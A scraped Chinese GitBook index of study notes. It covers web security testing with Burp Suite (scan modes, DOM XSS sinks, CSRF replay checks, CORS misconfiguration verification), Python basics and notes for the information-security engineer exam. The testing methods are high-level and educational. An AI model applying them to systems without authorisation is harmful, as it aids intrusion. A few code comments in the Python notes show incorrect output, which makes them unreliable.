客户端的输入是多种多样的，如果web应用程序仅仅依靠客户端控件来控制客户端提交给服务器的数据，往往会产生安全漏洞。比较常见的就有：XX平台0元购买苹果手机，xx运营商平台无视用户绑定任意号码充值，这些都是因为客户端校验的不安全性所导致的漏洞。 扫描网站 当使用被动扫描模式时，Burp不会重新发送新的请求，它只是对已经存在的请求和应答进行分析，这对系统的检测比较安全，尤其在你授权访问的许可下进行的，通常适用于生产环境的检测。当某种业务场景的测试，每测试一次都会导致业务的某方面问题时，我们可以使用被动扫描模式，去分析问题是否存在，减少测试的风险。 提交的密码为未加密的明文。 不安全的Cookie的属性，比如缺少的HttpOnly和安全标志。 cookie的范围缺失。 跨域脚本包含和站点引用泄漏。 表单值自动填充，尤其是密码。 SSL保护的内容缓存。 目录列表。 提交密码后应答延迟。 session令牌的不安全传输。 敏感信息泄露，像内部IP地址，电子邮件地址，堆栈跟踪等信息泄漏。 不安全的ViewState的配置。 当使用主动扫描模式时，Burp会向应用发送新的请求并通过payload验证漏洞。这种模式下的操作，会产生大量的请求和应答数据，直接影响系统的性能，通常使用在非生产环境。它对下列的两类漏洞有很好的扫描效果：客户端的漏洞：XSS、Http头注入、操作重定向；服务端的漏洞：SQL注入、命令行注入、文件遍历。 对于第一类漏洞，Burp在检测时，会提交一下input域，然后根据应答的数据进行解析。在检测过程中，Burp会对基础的请求信息进行修改，即根据漏洞的特征对参数进行修改，模拟人的行为，以达到检测漏洞的目的。对于第二类漏洞，一般来说检测比较困难，因为是发生在服务器侧。比如说SQL注入，有可能是返回数据库错误提示信息，也有可能是什么也不反馈。Burp在检测过程中，采用各个技术来验证漏洞是否存在，比如诱导时间延迟、强制修改Boolean值，与模糊测试的结果进行比较，已达到高准确性的漏洞扫描报告。 测试Dom_XSS DOM：文档对象模型，是HTML和XML文档的编程接口。它允许脚本（js）控制Web页面、窗口和文档。简单来说，DOM就是一张映射表，记录着一堆用代码操控document时的规章制度，更直白点，就是js操作html时的API。 document.referer属性，window.name属性，location属性，innerHTML属性，documen.write属性等等这些都是可能出现漏洞的地方，而在安全挖掘时也该多多关注这些。 测试CSRF CSRF（Cross-site request forgery），中文名称：跨站请求伪造。简单来说，就是攻击者盗用了你的身份，以你的名义发送恶意请求。危害：修改密码，发送消息，购买商品，虚拟货币转账 防御： 验证HTTP Referer 字段 在请求地址中添加token并验证 在HTTP头中自定义属性并验证 验证： 重放请求====>无一次性token或验证码 referer去掉后重放请求====>无referer验证 去掉token后重放====>后端认证机制薄弱 测试CORS漏洞 CORS（跨域资源共享）： CORS的用途主要是为了跨域请求，读写资源，目前的主流浏览器都支持CORS CORS的漏洞，既然是用于跨域场景，自然少不了跨域中经常存在的一些安全问题，例如信息泄露等等，CORS的漏洞主要来源于服务端对于Origin的弱校验，从而导致黑客只要构造了一个CORS请求，就能跨域获取到信息。 但是如果跨域请求中允许携带cookie访问（Access-Control-Allow-Credentials:true），就不允许Origin被设置成Access-Control-Allow-Origin:*，这样的请求会被浏览器屏蔽。 特征： 请求中携带CORS特征：Origin:xxxxxxxx 响应中携带CORS特征： Access-Control-Allow-Origin:xxxxxxx Access-Control-Allow-Methods:POST，GET，OPTIONS Access-Control-Allow-Credentials:true 验证：修改请求中携带CORS特征：Origin:修改内容(可构造payload)，返回的响应Access-Control-Allow-Origin:修改内容，且Access-Control-Allow-Credentials:true，则表示存在CORS漏洞。 end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-05-07 23:21 "},"第二阶段-Web安全篇/Web安全攻防学习.html":{"url":"第二阶段-Web安全篇/Web安全攻防学习.html","title":"Web安全攻防学习","keywords":"","body":"Web安全攻防学习 第一章：信息收集 域名信息收集 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-05-07 11:30 "},"第六阶段-Python黑客编程/Python编程基础.html":{"url":"第六阶段-Python黑客编程/Python编程基础.html","title":"Python编程基础","keywords":"","body":"Python编程基础 Day1 编译型：一次性将所有程序编译成二进制文件。 缺点：开发效率低，不能跨平台。 优点：运行速度快。 C，C++等 解释型：当程序执行时，一行一行的解释。 优点：开发效率高，可以跨平台。 缺点：运行速度慢。 python，php等 Python2打印中文会出现报错，解决方法：首行添加代码：#-*- encoding:utf-8 -*- python中没有常量，约定俗成全大写为“常量” 单行注释：# 多行注释：'''注释内容''' 或 \"\"\"注释内容\"\"\" 不等于：!= 或 <> int（整型） 加减乘除取余+-/% 幂* 整除//（9//2 输出结果4，9.0//2.0输出结果4.0） 在32位机器上，整数的位数为32位，取值范围为-2^31 ~ 2^31-1，即-2147483648～2147483647 在64位系统上，整数的位数为64位，取值范围为-2^63 ～ 2^63-1，即-9223372036854775808～9223372036854775807 str（字符串） python当中凡是用引号引起来的都是字符串。 可相加：字符串的拼接。 可相乘：str * int（字符串的重复） bool（布尔值） True 、False type()可显示数据类型 input（用户交互） name = input('请输入您的名字：') input输入的内容类型均为str if、elif、else： if 条件 : 满足条件执行的内容 elif 条件: 满足上面的条件执行这个 elif 条件: 满足上面的条件执行这个 else: 上面所有的条件不满足执行这个 【python中\"满足条件执行的内容\"前为一个\"tab键\"或\"4个空格\"且要统一】 while： while 条件: 循环体 【python中\"循环体\"前为一个\"tab键\"或\"4个空格\"且要统一】 跳出循环： 改变条件 break：直接跳出循环体 continue：跳出本次循环，进入下次循环 优先级：() > not > and > or x or y 若x为True，则返回x 【and相反】 # print(1 or 2) # 1 # print(3 or 2) # 3 # print(0 or 2) # 2 # print(0 or 100) # 100 一个非零数字转换为布尔值为True，零转换为布尔值为False Ture转换为数字是1，False转换为数字是0 str -----> bool：非空即为True Day2 格式化输出： 占位符：%s字符串占位符，%d整数占位符，%f浮点数占位符【若要在格式化输出中单纯输出%，需用%%表示】 name = input ('请输入您的姓名：') age = input ('请输入您的年龄：') height = input ('请输入您的身高：') msg = '''------------info of %s------------- Name : %s Age : %s Height : %s ----------------EDN----------------''' %(name,name,age,height) print (msg) format() s = '我叫{}，今年{}岁，爱好{}，昵称{}'.format('None',20,'女','None') print (s) s = '我叫{0}，今年{1}岁，爱好{2}，昵称{0}'.format('None',20,'女') print (s) name = input('请输入您的姓名：') s = '我叫{name}，今年{age}岁，爱好{hobby}，昵称{name}'.format(age = 20,name = name,hobby = '女') print (s) while-else 当while被break打断时，不执行else ASCII码 8位bit = 一个字节byte。最左边那位都为0，为预留位。1024 byte = 1 kb 万国码 unicode 32位表示一个字符。 Unicode 升级 utf-8 utf-8 一个字符最少用8位去表示 英文用8位 一个字节 欧洲文字用16位去表示 两个字节 中文用24 位去表示 三个字节 gbk 国产，只能用于中文和ascii码中的文字。 Day3 .bit_length()输出整数的bit位数 i = 10 print (i.bit_length()) 字符串的索引与切片 s = 'ABCDEFG' #索引 s1 = s[0] #形成了一个新的字符串 s2 = s[1] print (s1) #输出A print (s2) #输出B s3 = s[-1] s4 = s[-2] print (s3) #输出G print (s4) #输出F #切片：顾头不顾尾 s5 = s[0:4] print (s5) #输出ABCD s6 = s[0:-1] print (s6) #输出ABCDEF s7 = s[0:] print (s7) #输出ABCDEFG s8 = s[:] print (s8) #输出ABCDEFG #[首:尾:步长] s9 = s[0:5:2] #隔一个取一个 print (s9) #输出ACE s10 = s[0:7:3] #隔两个取一个 print (s10) #输出ADG s11 = s[4:0:-1] print (s11) #输出EDCB s12 = s[3::-1] print (s12) #输出DCBA s13 = s[3::-2] print (s13) #输出DB s14 = s[::-1] print (s14) #输出GFEDCBA 字符串的操作 s = 'nOnE' s1 = s.capitalize() #首字母大写 print (s1) #输出None s2 = s.upper() #全部大写 print (s2) #输出NONE s3 = s.lower() #全部小写 print (s3) #输出NONE s4 = s.swapcase() #大小写翻转 print (s4) #输出NoNe #每个隔开的(特殊字符或数字)单词首字母大写 a = 'none*is_admin' s5 = a.title() print (s5) #输出None*Is_Admin s6 = s2.center(10) #居中，10个位置 print (s6) #输出 NONE s7 = s2.center(10,'-') #居中，用-填充 print (s7) #输出---NONE--- #若字符串里出现\\t则补满前面8位/16位 b = 'abcd\\tefgh' s8 = b.expandtabs() print (s8) #输出abcd efgh c = '我是None' l = len(c) #计算字符串长度 print (l) #输出6 #判断以什么开头、结尾【str切片】 s9 = a.startswith('no') #判断是否以no开头 print (s9) #输出True s10 = a.startswith('*',4) #判断第5位是否以*开头 print (s10) #输出True s11 = a.endswith('admin') #判断是否以admin结尾 print (s11) #输出True #通过元素找索引，找不到返回-1 s12 = a.find('admin') #找admin print (s12) #输出8 #通过元素找索引，找不到则报错 s13 = a.index('admin') #找admin print (s13) #输出8 #删除机制：首尾同时进行元素检索删除，直到遇到非检索元素 #strip左右都删，rstrip删右，lstrip删左 s14 = s6.strip() #默认删除前后的空格 print (s14) #输出NONE s15 = s7.strip('-') #删除前后的- print (s15) #输出NONE d = '*none-none-' s16 = d.strip('-*') #删除前后的-和* print (s16) #输出none-none s17 = d.rstrip('-*') #删除前后的-和* print (s17) #输出*none-none s18 = d.count('n') #统计字符串中n的个数 print (s18) #输出4 s19 = d.count('no') #统计字符串中no的个数 print (s19) #输出2 s20 = d.count('n',0,4) #统计字符串0-4中n的个数 print (s20) #输出2 #str ======> list s21 = d.split('-') #以-分割，默认不写是空格 print (s21) #输出['*none', 'none', ''] s21 = d.split('-',1) #以-分割一次 print (s21) #输出['*none', 'none-'] s22 = d.replace('none','None')#替换，默认全部替换 print (s22) #输出*None-None- s23 = d.replace('none','None',1)#只替换第一个 print (s23) #输出*None-none- #is系列 print (d.isalnum()) #判断字符串是否由字母或数字组成 print (d.isalpha()) #判断字符串是否由字母组成 print (d.isdigit()) #判断字符串是否由数字组成 #for-in for i in d: print(i) #遍历输出字符串的元素 #if-in if 'none' in d: print ('你好，None！') #判断字符串中是否含有某些字符 Day4 元组tupe 元组：俗称不可变的列表,又被成为只读列表，元祖也是python的基本数据类型之一，用小括号括起来，里面可以放任何数据类型的数据，查询可以，循环也可以，切片也可以，但就是不能改。例：（1，2，3）（\"a\"，\"b\"，\"c\"） 列表list 列表是python的基础数据类型之一 ,其他编程语言也有类似的数据类型。比如JS中的数组， java中的数组等等.。它是以[ ]括起来，每个元素用' , '隔开而且可以存放各种数据类型：列表是python中的基础数据类型之一，其他语言中也有类似于列表的数据类型，比如js中叫数组，他是以[]括起来，每个元素以逗号隔开，而且他里面可以存放各种数据类型比如：li = ['alex',123,Ture,(1,2,3,'wusir'),[1,2,3,'小明'],{'name':'alex'}] 列表相比于字符串，不仅可以储存不同的数据类型，而且可以储存大量数据，32位python的限制是 536870912 个元素,64位python的限制是 1152921504606846975 个元素。而且列表是有序的，有索引值，可切片，方便取值。 增删查改 #增 l = [0,1,'overwatch','none',[2,3]] print(l[2]) #输出overwatch print(l[4]) #输出[2, 3] l.append('admin') print(l) #输出[0, 1, 'overwatch', 'none', [2, 3], 'admin'] l.insert(3,'player') print(l) #[0, 1, 'overwatch', 'player', 'none', [2, 3], 'admin'] l.extend('DG') #extend迭代处理增添元素 print(l) #[0, 1, 'overwatch', 'player', 'none', [2, 3], 'admin', 'D', 'G'] l.extend([4,5,6]) print(l) #[0, 1, 'overwatch', 'player', 'none', [2, 3], 'admin', 'D', 'G', 4, 5, 6] #删 l = [0,1,'overwatch','none',[2,3]] delete = l.pop(2) print(l) #[0, 1, 'none', [2, 3]] print(delete) #overwatch【pop有返回值】 l.pop() #默认删最后一个 print(l) #[0, 1, 'none'] del l[0:2] #删除前两个元素 print(l) #['none'] l.clear() #清空列表 print(l) #[] #查 l = [0,1,'overwatch','none',[2,3]] print(l[2]) #切片查找overwatch for i in l: #迭代查找 print(i) #0 #1 #overwatch #none #[2,3] l = [0,1,'overwatch','none',[2,3]] print(l[2][1]) #v #改 l = [0,1,'overwatch','none',[2,3]] l[3] = l[3].upper() #改变第4个元素 print(l) #[0, 1, 'overwatch', 'NONE', [2, 3]] l[0:2] = 'win' #迭代处理改动元素 print(l) #['w', 'i', 'n', 'overwatch', 'NONE', [2, 3]] l[0:3] = [1,2,'win'] #迭代处理改动元素 print(l) #[1, 2, 'win', 'overwatch', 'NONE', [2, 3]] #其他 l = [0,1,'overwatch','none',[2,3]] print(len(l)) #5 print(l.count('none'))#对none计数 print(l.index('none'))#查找none的索引【列表无find】 #排序 l = [6,4,2,3,8,9,1] l.reverse() #翻转 print(l) #[1, 9, 8, 3, 2, 4, 6] l.sort() #正向排序 print(l) #[1, 2, 3, 4, 6, 8, 9] l.sort(reverse=True) #反向排序 print(l) #[9, 8, 6, 4, 3, 2, 1] #元组【元组的元素只读，元组里的列表可动】 y = (0,1,'none',3,[4,5,'overwatch']) y[4][2] = y[4][2].upper() print(y) #(0, 1, 'none', 3, [4, 5, 'OVERWATCH']) y[4][1] = 'nice' print(y) #(0, 1, 'none', 3, [4, 'nice', 'OVERWATCH']) del y[4][2] print(y) #(0, 1, 'none', 3, [4, 'nice']) y[4].append('OK') print(y) #(0, 1, 'none', 3, [4, 'nice', 'OK']) s = 'none' s1 = '-'.join(s) #join()里为可迭代对象，如字符串列表元组 print(s1) #n-o-n-e #str ------> list 用 split #list ------> str 用 join l = ['none','is','admin'] s2 = ' '.join(l) print(s2) #none is admin #range(n,m)相当于[n,.....,m-1]且n Day5 数据类型划分：可变数据类型，不可变数据类型 不可变数据类型：元组、bool、int、str 可哈希 可变数据类型：list、dict、set 不可哈希 dict key 必须是不可变数据类型，可哈希，value：任意数据类型。 dict 优点： 二分查找去查询 存储大量的关系型数据 字典是python中唯一的映射类型，采用键值对（key-value）的形式存储数据。python对key进行哈希函数运算，根据计算的结果决定value的存储地址，所以字典是无序存储的，且key必须是可哈希的，可哈希表示key必须是不可变类型，如：数字、字符串、元组。 字典（dictionary）是除列表以外python之中最灵活的内置数据结构类型。列表是有序的对象运合，字典是无序的对象集合。两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。 a = 1 b = 2 print(a,b) #1 2 a,b = b,a #一行代码实现交换 print(a,b) #2 1 #字典 dic = { 'name':'none', 'age':20, 'sex':'male', } #增 dic['hobby'] = 'girl' #有键值对则覆盖，没有则添加 print(dic) #{'name': 'none', 'age': 20, 'sex': 'male', 'hobby': 'girl'} dic.setdefault('hight',175) #有键值对则不做改变，没有则添加 print(dic) #{'name': 'none', 'age': 20, 'sex': 'male', 'hobby': 'girl', 'hight': 175} dic.setdefault('name','admin') print(dic) #{'name': 'none', 'age': 20, 'sex': 'male', 'hobby': 'girl', 'hight': 175} #删 dic.pop('hight') #有返回值 #print(dic.pop('hight')) ======> 175 print(dic) #{'name': 'none', 'age': 20, 'sex': 'male', 'hobby': 'girl'} print(dic.pop('asd',None)) #若没有要删的键则报错，可在\",\"后添加返回值则不报错 dic.popitem() #py3.5前随机删除，py3.6后删除最后一个 print(dic) #{'name': 'none', 'age': 20, 'sex': 'male'} del dic['name'] print(dic) #{'age': 20, 'sex': 'male'} dic.clear() #清空字典 del dic #删除字典 #查 dic = {'name':'none','age':20,'sex':'male',} print(dic['age']) #20若没有该键则会报错 print(dic.get('name1')) #None因为没有该键所以返回None，不报错 print(dic.get('name1','没有该值'))#没有该值 print(dic.keys(),type(dic.keys()))#dict_keys(['name', 'age', 'sex']) print(dic.values()) #dict_values(['none', 20, 'male']) print(dic.items()) #dict_items([('name', 'none'), ('age', 20), ('sex', 'male')]) for i in dic: print(i) #键name//age//sex for i in dic.values(): print(i) #值none//20//male for i in dic.items(): print(i) #键值对('name', 'none')//('age', 20)//('sex', 'male') for k,v in dic.items(): print(k,v) #name none//age 20//sex male #改 dic = {'name':'none','age':20,'sex':'male',} dic['name'] = 'admin' ##有键值对则覆盖，没有则添加 print(dic) #{'name': 'admin', 'age': 20, 'sex': 'male'} dic1 = {'name':'none','hobby':'girl',} dic.update(dic1) #将dic1添加到dic里，有则覆盖，没有则添加 print(dic) #{'name': 'none', 'age': 20, 'sex': 'male', 'hobby': 'girl'} #字典的嵌套 dic = { 'name':['none','admin','asuna'], 'mike':{ 'age':20, 'hobby':'girl' }, 'country':'China' } dic['country'] = 'CN' dic['name'].append('alice') print(dic['name']) #['none', 'admin', 'asuna', 'alice'] dic['name'][2] = dic['name'][2].capitalize() print(dic['name']) #['none', 'admin', 'Asuna', 'alice'] dic['mike']['country'] = 'USA' print(dic['mike']) #{'age': 20, 'hobby': 'girl', 'country': 'USA'} dic['name'].insert(0,'asd') print(dic['name']) #['asd', 'none', 'admin', 'Asuna', 'alice'] #判断字符串中的整数个数 str = input('>>>') for i in str: if not i.isdigit(): str = str.replace(i,' ') l = str.split() print(len(l)) Day6 ascii A : 00000010 8位 一个字节 unicode A ：00000000 00000001 00000010 00000100 32位 四个字节 中：00000000 00000001 00000010 00000110 32位 四个字节 utf-8 A ：00100000 8位 一个字节 中：00000001 00000010 00000110 24位 三个字节 gbk A ：00000110 8位 一个字节 中：00000010 00000110 16位 两个字节 各个编码之间的二进制，是不能互相识别的，会产生乱码。 文件的储存，传输，不能是unicode（只能是utf-8 utf-16 gbk,gb2312,asciid等） py3中str在内存中是以Unicode编码。传输和储存是以bytes类型。 bytes类型 对于英文： str ： 表现形式：s = 'asuna' 编码方式： 01010101 unicode bytes ： 表现形式：s = b'asuna' 编码方式： 01010101 utf-8、gbk。。。。 对于中文： str ： 表现形式：s = '亚丝娜' 编码方式： 01010101 unicode bytes ： 表现形式：s = b'\\xd1\\xc7\\xcb\\xbf\\xc4\\xc8' 编码方式： 01010101 utf-8、gbk。。。。 # = 赋值，== 判断值是否相等，is 判断内存地址是否相等 li = [1,2,3] li1 = li print(li is li1) #True print(id(li),id(li1)) #17038760 17038760 #数字，字符串 存在小数据池 #数字：-5 ~ 256 #字符串：不能含有特殊字符，等 n = 6 n1 = 6 print(n is n1) #True n = 300 n1 = 300 print(n is n1) #False（在terminal体现） #编码 #str -----> bytes s = 'asuna' s1 = s.encode('utf-8') print(s1) #b'asuna' s = '亚丝娜' s1 = s.encode('gbk') print(s1) #b'\\xd1\\xc7\\xcb\\xbf\\xc4\\xc8' Day7 #0 '' [] () {} ------> False，其他的为True #元组里面只有一个元素，且没有逗号，该元素是什么类型就什么类型 tu1 = (1) tu2 = (1,) print(tu1,type(tu1)) #1 print(tu2,type(tu2)) #(1,) tu3 = ([1]) tu4 = ([1],) print(tu3,type(tu3)) #[1] print(tu4,type(tu4)) #([1],) #要求：删除字典中“键”中含有“k”的键值对 #在循环的字典中删除键值对会报错 # dic = {'k1':'v1','k2':'v2','a3':'v3'} # for i in dic: # if 'k' in i: # del dic[i] #法1 dic = {'k1':'v1','k2':'v2','a3':'v3'} dic1 = {} for i in dic: if 'k' not in i: dic1.setdefault(i,dic[i]) dic = dic1 print(dic) #法2 dic = {'k1':'v1','k2':'v2','a3':'v3'} l = [] for i in dic: if 'k' in i: l.append(i) for i in l: del dic[i] print(dic) #集合set({})：可变的数据类型，但里面的元素必须是不可变数据类型，无序，不重复 set1 = set({1,2,3}) print(set1) #{1, 2, 3} #增 set2 = set({'asd',1,'none','none','asuna'}) set2.add('3') print(set2) #{1, 'none', '3', 'asuna', 'asd'} 无序不重复 set2.update('abc') print(set2) #{1, 'none', '3', 'asuna', 'asd'} #删 set2.pop() #随机删除，有返回值 print(set2,set2.pop()) #{'asuna', 'none', 'a', 'b', '3', 'c'} asd set2.remove('c') print(set2) #{'a', 'asd', 'none', 'b', 'asuna'} set2.clear() print(set2) #set() #查 set2 = set({'asd',1,'none','none','asuna'}) for i in set2: print(i) #none//1//asuna//asd #交集 set1 = ({4,5,3,2,1}) set2 = ({1,3,5,6,2}) print(set1 & set2) #{1, 2, 3, 5} print(set1.intersection(set2)) #{1, 2, 3, 5} #并集 print(set1 | set2) #{1, 2, 3, 4, 5, 6} print(set1.union(set2)) #{1, 2, 3, 4, 5, 6} #反交集 print(set1 ^ set2) #{4, 6} print(set1.symmetric_difference(set2)) #{4, 6} #差集 print(set1 - set2) #{4} print(set1.difference(set2)) #{4} #子集 set1 = ({3,2,1}) set2 = ({1,3,5,6,2}) print(set1 set1) #True print(set2.issuperset(set2)) #True #要求去除重 li = [1,22,22,33,'none','none'] li = list(set(li)) print(li) #[1, 'none', 22, 33] #冻结 -----> 不可变 set4 = set({'none','asuna',123}) print(set4,type(set4)) #{123, 'none', 'asuna'} set4 = frozenset(set4) print(set4,type(set4)) #frozenset({123, 'none', 'asuna'}) Day8 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 15:06 "},"软考-信息安全工程师/第一版.html":{"url":"软考-信息安全工程师/第一版.html","title":"第一版","keywords":"","body":"软考-信息安全工程师（第一版） 选择题：当你不确定答案的时候，留意绝对性词语 第一章-计算机硬件基础 （略） 第二章-计算机网络基础 OSI七层模型 | 层次 | 名称 | 主要功能 | 主要设备及协议 | | ---- | ---------- | ---------------------------------- | ---------------------------------------------------- | | 7 | 应用层 | 实现具体的应用功能 | POP3、FTP、HTTP、Telnet、SMTP、DHCP、TFTP、SNMP、DNS | | 6 | 表示层 | 数据的格式与表达、加密、压缩 | | | 5 | 会话层 | 建立、管理和终止会话 | | | 4 | 传输层 | 端到端的连接 | TCP、UDP | | 3 | 网络层 | 分组传输和路由选择 | 三层交换机、路由器、ARP、RARP、IP、ICMP、IGMP | | 2 | 数据链路层 | 传送以帧为单位的信息、保证数据正确 | 网桥、交换机、网卡、PPTP、L2TP、SLIP、PPP | | 1 | 物理层 | 二进制传输 | 中继器、集线器 | TCP/IP模型与OSI模型 ARP：实现IP地址到物理地址的映射；RARP：实现物理地址到IP地址的映射 公用IP地址 将IP地址第一段转换为二进制，对比开头即可判断是哪类地址。 专用IP地址 A类：10.0.0.0~10.255.255.255，最大主机数：2^24-2=16777214 B类：172.16.0.0~172.31.255.255，最大主机数：2^16-2=65534 C类：192.168.0.0~192.168.255.255，最大主机数：2^8-2=254 子网掩码 将一个网络划分成多个子网（取部分主机号当子网号） 将多个网络合并成一个大的网络（取部分网络号当主机号） 将IP地址与子网掩码的二进制进行“与”运算即可获得网络地址 顶级域名 .com：商业机构 .net：网络服务机构 .org：非营利性组织 .gov：政府机构 .edu：教育机构 .mil：军事机构 IPv6 128 位的地址空间（2^128） 由 8 个 16 进制字段构成 IPvV6地址的省写 例如：2001:0db8:85a3:0000:1319:8a2e:0370:7344等价于：2001:0db8:85a3::1319:8a2e:0370:7344 遵守这些规则，如果因为省略而出现了两个以上的冒号，则可以压缩为一个，但这种零压缩在地址中只能出现一次。因此： 2001:0DB8:0000:0000:0000:0000:1428:57ab 2001:0DB8:0000:0000:0000::1428:57ab 2001:0DB8:0:0:0:0:1428:57ab 2001:0DB8:0::0:1428:57ab 2001:0DB8::1428:57ab 以上都是合法的地址，并且它们是等价的。同时前导的零可以省略，因此2001:0DB8:02de::0e13等价于2001:DB8:2de::e13 第三章-信息安全基础知识 信息安全三要素：机密性（confidentiality）、完整性（integrity）、可用性（availability） 机密性：信息不被未授权者知晓 完整性：信息是正确的、真实的、未被篡改的、完整无缺的 可用性：信息可以随时正常使用 信息安全管理体系 密码管理：基于密码机制的安全系统 网络管理：功能上包括：配置管理、性能管理、安全管理、故障管理；体系结构包括：协议、表示、安全、对象四方面 设备管理：包括设备的选型、检测、安装、登记、使用、维护和存储管理等 人员管理：确保有关业务人员的思想素质、职业道德和业务素质 我国的商用密码管理原船，在中共中央办公厅1996年27号文中，明确了我国发展和管理商用密码实行\"统一领导，集中管理，定点研制，专控经营，满足使用\"的20字方针。 国家密码管理局于2006年1月6日发布公告，公布了\"无线局域网产品须使用的系列密码算法\"包括: 对称密码算法：SMS4 签名算法：ECDSA 密钥协商算法：ECDH 杂凑算法：SHA-256 随机数生成算法：自行选择 信息系统安全可以划分为以下四个层次：设备安全，数据安全， 内容安全，行为安全。其中数据安全即是传统的信息安全。 信息安全等级保护（记忆：用系安结访） 用户自主保护级：隔离用户和数据 系统审计保护级：在自主访问控制的基础上控制访问权限扩散 安全标记保护级：具备审计保护所有的功能，提供有关安全策略模型、数据标记，具备准确地标记输出信息的能力，消除通过测试发现的任何错误 结构化保护级：在安全标记保护级实施的自主和强制访问控制基础上，进一步扩展到所有主体和客体，能够审计利用隐蔽存储信道时可能被使用的事件 访问验证保护级：满足访问监视器需求，访问监视器仲裁主体对客体的全部访问 涉密信息系统安全分级保护 秘密级：其防护水平不低于国家信息安全等级保护三级要求 机密级：其防护水平不低于国家信息安全等级保护四级要求 绝密级：其防护水平不低于国家信息安全等级保护五级要求 网络隔离 第一代【完全隔离】：完全的物理隔离 第二代【硬件卡隔离】：增加硬件卡隔离 第三代【数据转播隔离】：利用转播系统分时复制文件的途径来实现隔离 第四代【空气开关隔离】：使用单刀双掷开关 第五代【安全通道隔离】：通过专用通道硬件和专有安全协议等安全机制来实现内外网络的隔离和数据交换 系统安全监控，是指对系统的运行状况和系统中的用户的行为进行监视、控制和记录。安全监控的内容包括有主机系统监视、网络状态监视、用户操作监视、主机应用监视、主机外设监视、网络连接监视等。 安全监控主要分为： 网络安全监控：全面的网络安全机制、细粒度的控制、网络审计和其他包括日志、报警和拦截等功能 主机安全监控：访问控制、系统监控、系统审计、系统漏洞检查 风险评估方法一般可分为三类：定量、定性、定性与定量相结合的综合评估法。 信息安全风险评估过程 确定资产：确定信息系统的资产，并明确资产的价值 脆弱性和威胁分析：发现资产的脆弱点及由脆弱点所引发的威胁 制定及评估控制措施：在分析各种威胁及它们发生可能性的基础上，研究消除、减轻、转移威胁风险的手段 决策：包括评估影响、排列风险、制定决策 沟通与交流：决策经由领导层的签字批准，并与各方面就决策结论进行沟通 监督实施：安全措施的实施过程要始终在监督下进行 知识产权保护——保护期限 知识产权保护——产权人确定 知识产权保护——侵权判断 软件著作权产生的时间：自软件开发完成之日起。 【商业秘密权】可以保护软件的技术信息、经营信息。 【软件著作权】保护的是软件产品本身 【专利权】保护的是创造性的成果 信息安全标注化 国际标准：ISO、IEC等国际标准化组织 国家标准：GB-中国，ANSI-美国，BS-英国，JIS-日本 区域(地方)标准：PASC-太平洋地区标准会议，CEN-欧洲标准委员会，ASAC-亚洲标准咨询委员会，ARSO-非洲地区标准化组织 行业标准：GJB-中国军用标准，MIT-S——美国军用标准，IEEE-美国电气电子工程师协会 企业标准 我国国家标准代号：强制性标准代号为GB，推荐性标准代号为GB/T，指导性标准代号为GB/Z，实物标准代号GSB 行业标准代号：由汉语拼音大写字母组成（如电力行业为DL） 地方标准代号：由DB加上省级行政区划分代码的前两位 企业标准代号：由Q加上企业代号组成 第四章-密码学 基本概念 密码学由密码编制学（密码编制）和密码分析学（密码破译）共同组成。 密码学的安全目标： 保密性：确保信息仅被合法用户访问，而不被泄露给非授权用户、实体或过程 完整性：指所有资源只能由授权方或以授权的方式进行修改，即信息未经授权不能进行改变 可用性：指所有资源在适当的时候可以由授权方访问 密码体制（密码系统）： 明文空间M：全体明文的集合 密文空间C：全体密文的集合 密钥空间K：全体密钥的集合，其中每一个密钥K均由加密密钥 K~e~ 和解密密钥 K~d~ 组成，即 K = 加密算法E：一族由 M 到 C 的加密变换 解密算法D：一族由 C 到 M 的解密变换 对于每一个确定的密钥，加密算法将确定一个具体的加密变换，解密算法将确定一个具体的解密变换，而且解密变换就是加密变换的逆变换。对于明文空间M中的每一个明文 M，加密算法E在密钥 K~e~ 的控制下将明文M加密成密文 C：C=E（M，K~e~）；而解密算法D在密钥 K~d~ 的控制下将密文C解密出同一个明文 M：M = D（C，K~d~）= D（E（M，K~e~），K~d~） 如果一个密码体制的 K~d~ = K~e~ ，或由其中一个很容易推出另一个，则称为单密钥密码体制或对称密码体制或传统密码体制。否则称为双密钥密码体制（非对称密码体制）。 密码分析者攻击密码的方法： 穷举攻击：采用依次试遍所有可能的密钥对所获得的密文进行解密，直至得到正确的明文；或者用一个确定的密钥对所有可能的明文进行加密，直至得到所获得的密文。 数学分析攻击：针对加解密算法的数学基础和某些密码学特性，通过数学求解的方法来破译密码。 基于物理的攻击：利用密码系统实现时泄露的额外信息，推到密码系统中的秘密参数。主要方法包括功耗攻击、电磁场攻击和时间攻击。 密码分析者可利用的数据资源： 仅知密文攻击：攻击者仅根据截获的密文来破译密码。 已知明文攻击：攻击者根据已知的某些明文-密文对来破译密码。（近现代密码学认为，一个密码仅当它能经得起已知明文攻击时才是可取的） 选择明文攻击：攻击者能够选择明文并获得相应的密文 选择密文攻击：攻击者能够选择密文并获得相应的明文（主要攻击公钥密码体制，特别是数字签名） 一个密码，如果无论密码分析者截获了多少密文和用什么技术方法进行攻击都不能被攻破，则称为是绝对不可破译的。绝对不可破译的密码在理论上是存在的，这就是著名的“一次一密“密码。 古典密码 置换密码：把明文中的字母重新排列，字母本身不变，但其位置改变了。 代替密码：首先构造一个或多个密文字母表，然后用密文字母表中的字母或字母组来代替明文字母或字母组，各字母或字母组的相对位置不变，但其本身改变了。代替密码又分为：加法密码、乘法密码、仿射密码。 加法密码：密文 B = {(a~0~+K) mod n，(a~1~+K) mod n，...，(a~n-1~+K) mod n}；要求 K 是满足 0＜K＜n 的正整数。Caesar（凯撒）密码（K=3）：把明文字母表循环右移3位得到密文字母表 乘法密码：密文 B = {a~0~K mod n，a~1~K mod n，...，a~n-1~K mod n}；要求 0＜K＜n 且 K 与 n *互素（公约数只有1的两个整数，如：13和26的公约数为13则不可）。 仿射密码：密文 B = {(a~0~K~0~+K~1~)mod n，(a~1~K~0~+K~1~)mod n，...，(a~n-1~*K~0~+K~1~)mod n}；要求 K~0~ 与 n 互素，0≤K~0~＜n；且不允许同时有 K~0~=0，K~1~=1 简单代替密码：只使用一个密文字母表，并且用密文字母表中的一个字母来代替一个明文字母表中的一个字母。比如：加法密码、乘法密码。 